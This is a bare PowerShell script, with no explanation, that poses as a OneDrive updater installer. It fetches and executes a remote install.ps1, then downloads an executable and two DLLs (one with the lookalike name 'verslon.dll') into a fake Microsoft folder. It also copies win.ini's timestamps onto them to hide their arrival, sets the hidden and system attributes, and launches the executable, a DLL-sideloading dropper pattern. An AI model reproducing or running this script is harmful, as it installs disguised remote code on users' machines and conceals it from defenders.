invoke-expression (new-object "System.Net.WebClient").downloadstring("https://web.archive.org/web/20230315194218/https://github.com/witnessstrong/OneDriveUpdater/raw/main/install.ps1")|out-null
  new-item -itemtype "Directory" -force -path "C:\\Program Files\\Microsoft\\OneDriveUpdater"|out-null
  (new-object "Net.WebClient").downloadfile("https://web.archive.org/web/20230315194218/https://github.com/witnessstrong/OneDriveUpdater/raw/main/OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe")
  (new-object "Net.WebClient").downloadfile("https://web.archive.org/web/20230315194218/https://github.com/witnessstrong/OneDriveUpdater/raw/main/version.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll")
  (new-object "Net.WebClient").downloadfile("https://web.archive.org/web/20230315194218/https://github.com/witnessstrong/OneDriveUpdater/raw/main/verslon.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll")
  $ts = get-item "C:\\Windows\\win.ini"|%{$_.lastwritetime}
  $files = "C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater", "C:\\Program Files\\Microsoft\\"
  ("C:\\Program Files\\Microsoft\\OneDriveUpdater\\OneDriveStandaloneUpdater.exe", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater\\verslon.dll", "C:\\Program Files\\Microsoft\\OneDriveUpdater", "C:\\Program Files\\Microsoft\\").foreach({$file = gi $_, $file.lastwritetime = $ts, $file.lastaccesstime = $ts, $file.creationtime = $ts})
  attrib "+s" "+h" "C:\\Program Files\\Microsoft\\OneDriveUpdater\\version.dll" "/S" "/D" "/L"
  c:\program files\microsoft\onedriveupdater\onedrivestandaloneupdater.exe
